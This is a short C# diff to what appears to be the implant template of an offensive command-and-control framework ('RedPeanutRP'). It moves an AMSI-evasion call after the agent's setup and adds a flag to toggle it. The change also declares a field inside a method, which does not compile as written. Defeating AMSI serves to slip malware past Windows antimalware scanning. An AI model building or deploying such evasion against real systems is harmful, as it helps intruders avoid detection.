@@ -38,8 +38,6 @@ public class RedPeanutRP
 
     public static void Execute()
     {
-        Amsi.Evade();
-
         string[] pageget = {
             #PAGEGET#
         };
@@ -53,6 +51,7 @@ public class RedPeanutRP
         string host = "#HOST#";
 
         string namedpipe = "#PIPENAME#";
+        public bool amsievasion = true;
 
         int port = 0;
         int targetframework = 40;
@@ -70,6 +69,8 @@ public class RedPeanutRP
 
         string agentidrequesttemplate = new JavaScriptSerializer().Serialize(agentIdReqMsg);
         bool agentexit = false;
+
+        Amsi.Evade(amsievasion);
 
         while (true && !agentexit)
         {
